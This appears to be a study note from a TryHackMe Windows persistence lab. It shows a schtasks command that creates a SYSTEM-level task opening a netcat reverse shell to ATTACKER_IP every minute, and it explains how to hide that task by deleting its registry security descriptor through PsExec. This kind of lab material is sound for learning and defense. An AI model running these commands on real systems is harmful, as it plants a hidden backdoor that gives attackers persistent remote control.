## Creating a new task
- schedule tasks is using the built-in **Windows task scheduler**
- use `schtasks` to interact with the task scheduler
- Complete command reference: [schtasks command reference](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) 

```powershell
# Create a new scheduled task
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM

# Check the created task
schtasks /query /tn thm-taskbackdoor
```
## Hiding the task

-  To hide scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**.
- The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
- There is a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.
- To delete the SD we will use `psexec`  to open Regedit with SYSTEM privileges and delete the _SD_ entry for our task
```powershell
c:\tools\pstools\PsExec64.exe -s -i regedit
```

